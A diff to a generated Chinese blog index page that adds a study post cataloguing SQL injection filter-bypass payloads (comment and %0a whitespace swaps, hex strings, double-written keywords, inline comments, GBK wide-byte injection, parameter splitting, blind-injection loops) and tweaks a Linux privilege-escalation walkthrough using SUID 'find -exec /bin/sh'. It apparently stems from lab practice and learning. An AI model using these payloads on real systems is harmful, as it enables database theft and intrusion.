@@ -43,7 +43,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>37</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -70,6 +70,119 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-sql注入-绕过" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="post-time" datetime="2024-01-01T14:25:15.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/">sql注入_绕过</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="绕过空格（注释符-，-a0）"><a href="#绕过空格（注释符-，-a0）" class="headerlink" title="绕过空格（注释符&#x2F;* *&#x2F;，%a0）"></a>绕过空格（注释符&#x2F;* *&#x2F;，%a0）</h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/ （）</span><br></pre></td></tr></table></figure>
+
+<p>最基本的绕过方法，用注释替换空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure>
+
+<p>例如27a关禁用空格，用%0a来代替，布尔盲注代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ &#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;.format(i,tmp)</span><br></pre></td></tr></table></figure>
+
+<p>26a用（）来代替空格，布尔盲注代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ &quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;.format(i,tmp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="引号绕过（使用十六进制）"><a href="#引号绕过（使用十六进制）" class="headerlink" title="引号绕过（使用十六进制）"></a>引号绕过（使用十六进制）</h3><p>若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p>遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过（使用from或者offset）"><a href="#逗号绕过（使用from或者offset）" class="headerlink" title="逗号绕过（使用from或者offset）"></a>逗号绕过（使用from或者offset）</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p>使用join：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+<p>使用like：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1    #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="or-and-xor-not绕过"><a href="#or-and-xor-not绕过" class="headerlink" title="or and xor not绕过"></a>or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br><span class="line">如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过</span><br><span class="line">and=anandd    or=oorr</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="绕过注释符号（#，–(后面跟一个空格））过滤"></a>绕过注释符号（#，–(后面跟一个空格））过滤</h3><p>以单引号‘闭合为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br><span class="line">and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过union，select，where等"><a href="#绕过union，select，where等" class="headerlink" title="绕过union，select，where等"></a>绕过union，select，where等</h3><p><strong>（1）使用注释符绕过</strong></p>
+<p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）使用大小写绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）内联注释绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+<p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="多参数请求拆分"><a href="#多参数请求拆分" class="headerlink" title="多参数请求拆分"></a>多参数请求拆分</h3><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p>
+<p>例如请求URL时，GET参数格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>这时就可以将注入语句进行拆分，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/01/sql%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/" data-id="clqv109ks0000qsu4809x4hqn" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-网络渗透-web打点-信息搜集" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -128,7 +241,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231229161908397.png" alt="image-20231229161908397"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取root权限</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231229162122777.png" alt="image-20231229162122777"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
@@ -137,7 +250,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231229162356276.png" alt="image-20231229162356276"></p>
-<p>说明已经提权成功。</p>
+<p>输入处变成#，说明已经提权成功。</p>
 
       
     </div>
@@ -1234,96 +1347,6 @@
 
 
   
-    <article id="post-爬虫-异步爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/12/%E7%88%AC%E8%99%AB-%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB/" class="article-date">
-  <time class="post-time" datetime="2023-12-12T02:11:24.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">12</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/12/%E7%88%AC%E8%99%AB-%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB/">爬虫_异步爬虫</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="异步爬虫"><a href="#异步爬虫" class="headerlink" title="异步爬虫"></a>异步爬虫</h2><h3 id="多线程与多进程"><a href="#多线程与多进程" class="headerlink" title="多线程与多进程"></a>多线程与多进程</h3><blockquote>
-<ul>
-<li>进程:运行中的程序.每次我们执行一个程序,咱们的操作系统对自动的为这个程序准备一些必要的资源(例如,分配内存,创建一个能够执行的线程.)</li>
-<li>线程:程序内,可以直接被CPU调度的执行过程.是操作系统能够进行运算调度的最小单位.它被包含在进程之中,是进程中的实际运作单位.</li>
-</ul>
-</blockquote>
-<p><strong>何时使用</strong></p>
-<ol>
-<li>多线程:任务相对统一。互相特别相似。</li>
-<li>多进程:多个任务相互独立，很少有交集。</li>
-</ol>
-<h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p>在学习之前我们先了解一下线程 ：</p>
-<p>线程（Thread）也叫轻量级进程，是程序执行流的最小单元。它被包涵在进程之中，是进程中的一个实体，是被系统独立调度和分派的基本单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。一个线程可以创建和撤消另一个线程，同一进程中的多个线程之间可以并发执行。</p>
-<p>在Python3中引入了threading模块，同时thread模块在Python3中改名为_thread模块，threading模块相较于thread模块，对于线程的操作更加的丰富，而且threading模块本身也是相当于对thread模块的进一步封装而成，thread模块有的功能threading模块也都有，所以涉及到多线程的操作，一般都是使用threading模块。</p>
-<h5 id="多线程的优点"><a href="#多线程的优点" class="headerlink" title="多线程的优点"></a>多线程的优点</h5><p>多线程类似于同时执行多个不同程序，多线程运行有如下优点：</p>
-<ul>
-<li>提高并发性。通过线程可方便有效地实现并发性。进程可创建多个线程来执行同一程序的不同部分。</li>
-<li>进程之间不能共享内存，但线程之间共享内存非常容易。</li>
-<li>线程可以被抢占（中断），在其他线程正在运行时，线程可以暂时搁置（也称为睡眠） – 这就是线程的退让。</li>
-<li>开销少，操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此，使用多线程来实现多任务并发执行比使用多进程的效率高。</li>
-<li>通过创建多线程进程，每个线程在一个处理器上运行，从而实现应用程序的并发性，使每个处理器都得到充分运行。</li>
-<li>Python 语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了 Python 的多线程编程。操作更加简便。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread #导入多线程 </span><br></pre></td></tr></table></figure>
-
-<h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">def func(name):</span><br><span class="line">  for i in range(10):</span><br><span class="line">    print(name, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  t1 = Thread(target=func, args=(&#x27;周杰伦&#x27;,))</span><br><span class="line">  t2 = Thread(target=func, args=(&#x27;王力宏&#x27;,))</span><br><span class="line">  t1.start()</span><br><span class="line">  t2.start()</span><br></pre></td></tr></table></figure>
-
-<h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)</span><br><span class="line">from threading import Thread</span><br><span class="line">class MyThread(Thread):</span><br><span class="line">  def __init__(self, name):</span><br><span class="line">    super(MyThread, self).__init__()</span><br><span class="line">    self.name =name</span><br><span class="line"></span><br><span class="line">  def run(self):</span><br><span class="line">    for i in range(10):</span><br><span class="line">      print(self.name, i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  t1 = MyThread(&#x27;周杰伦&#x27;,)</span><br><span class="line">  t2 = MyThread(&#x27;王力宏&#x27;,)</span><br><span class="line">  t1.start()</span><br><span class="line">  t2.start()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212153547728.png" alt="image-20231212153547728"></p>
-<h5 id="线程池与多线程的区别"><a href="#线程池与多线程的区别" class="headerlink" title="线程池与多线程的区别"></a>线程池与多线程的区别</h5><p>线程池是在程序运行开始，创建好的n个线程，并且这n个线程挂起等待任务的到来。而多线程是在任务到来得时候进行创建，然后执行任务。<br>线程池中的线程执行完之后不会回收线程，会继续将线程放在等待队列中；多线程程序在每次任务完成之后会回收该线程。<br>由于线程池中线程是创建好的，所以在效率上相对于多线程会高很多。<br>线程池也在高并发的情况下有着较好的性能；不容易挂掉。多线程在创建线程数较多的情况下，很容易挂掉。</p>
-<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from concurrent.futures import ThreadPoolExecutor #导入线程池</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># def func(name):</span><br><span class="line">#   for i in range(10):</span><br><span class="line">#       print(name, i)</span><br><span class="line"></span><br><span class="line"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">#    with ThreadPoolExecutor(10) as t:</span><br><span class="line">#       for i in range(10):</span><br><span class="line">#          t.submit(func, f&#x27;周杰伦&#123;i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def func(name, t):</span><br><span class="line">  time.sleep(t)</span><br><span class="line">  print(&quot;我是&quot;, name)</span><br><span class="line">  return name</span><br><span class="line"></span><br><span class="line">def fn(res):</span><br><span class="line">  print(res.result())</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  with ThreadPoolExecutor(3) as t:</span><br><span class="line">      t.submit(func, &#x27;周杰伦&#x27;, 1).add_done_callback(fn)</span><br><span class="line">      t.submit(func, &#x27;王力宏&#x27;, 2).add_done_callback(fn)</span><br><span class="line">#      result = t.map(func, [&#x27;周杰伦&#x27;, &#x27;王力宏&#x27;], [2, 1])</span><br><span class="line">#      for r in result:</span><br><span class="line">#         print(r)   #map返回值是生成器，返回的内容和任务分发的顺序是一致的.</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212155033687.png" alt="image-20231212155033687"></p>
-<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)</span><br><span class="line">from threading import Thread</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">f = open(&#x27;data.csv&#x27;, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">def download(url):</span><br><span class="line">  headers = &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">    &quot;Connection&quot;:&quot;keep-alive&quot;,</span><br><span class="line">    &quot;Host&quot;:&quot;www.lvguo.net&quot;,</span><br><span class="line">    &quot;Pragma&quot;:&quot;no-cache&quot;,</span><br><span class="line">    &quot;Referer&quot;:&quot;https://www.lvguo.net/baojia/%E8%94%AC%E8%8F%9C/t2&quot;,</span><br><span class="line">    &quot;Sec-Ch-Ua&quot;:&#x27;&quot;Google Chrome&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;&#x27;,</span><br><span class="line">    &quot;Sec-Ch-Ua-Mobile&quot;:&quot;?0&quot;,</span><br><span class="line">    &quot;Sec-Ch-Ua-Platform&quot;:&quot;Windows&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Dest&quot;:&quot;document&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Mode&quot;:&quot;navigate&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Site&quot;:&quot;same-origin&quot;,</span><br><span class="line">    &quot;Sec-Fetch-User&quot;:&quot;?1&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  resp = requests.get(url=url, headers=headers)</span><br><span class="line">  # print(resp.text)</span><br><span class="line">  text = resp.text</span><br><span class="line">  # return text</span><br><span class="line"></span><br><span class="line"># def text_x(text):</span><br><span class="line">  tree = etree.HTML(text)</span><br><span class="line">  result = tree.xpath(&#x27;//table[@class=&quot;bjtbl&quot;]/tr&#x27;)[1:]</span><br><span class="line">  # print(result)</span><br><span class="line">  for tr in result:</span><br><span class="line">    td = tr.xpath(&#x27;./td/a/text()&#x27;)[1]</span><br><span class="line">    sd = tr.xpath(&#x27;./td/p/b/text()&#x27;)</span><br><span class="line">    cd = tr.xpath(&#x27;./td/span/text()&#x27;)</span><br><span class="line">    a = &#123;</span><br><span class="line">      td: [sd,cd]</span><br><span class="line">    &#125;</span><br><span class="line">    s = &quot;,&quot;.join(a)</span><br><span class="line">    # print(s)</span><br><span class="line">    # return</span><br><span class="line">    f.write(s)</span><br><span class="line">    f.write(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  start_page = int(input(&#x27;请输入起始页码：&#x27;))</span><br><span class="line">  end_page = int(input(&#x27;请输入结束页码：&#x27;))</span><br><span class="line">  with ThreadPoolExecutor(20) as t:</span><br><span class="line">    for i in range(start_page, end_page + 1):</span><br><span class="line">      url = f&quot;https://www.lvguo.net/baojia/%E8%94%AC%E8%8F%9C/t&#123;i&#125;&quot;</span><br><span class="line">      # print(url)</span><br><span class="line">      # t.submit(download, url)</span><br><span class="line">      download(url)</span><br><span class="line"></span><br><span class="line">  # text_x(text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231213163402259.png" alt="image-20231213163402259"></p>
-<h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from concurrent.futures import ProcessPoolExecutor #进程池</span><br><span class="line"></span><br><span class="line">def func(name):</span><br><span class="line">  for i in range(10):</span><br><span class="line">    print(name, i)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  p1 = Process(target=func, args=(&#x27;周杰伦&#x27;,))</span><br><span class="line">  p2 = Process(target=func, args=(&#x27;王富贵&#x27;,))</span><br><span class="line">  p1.start()</span><br><span class="line">  p2.start()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231213170951148.png" alt="image-20231213170951148"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/12/%E7%88%AC%E8%99%AB-%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB/" data-id="clq83vtzx0001vku44jega2ho" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1368,7 +1391,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>37</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
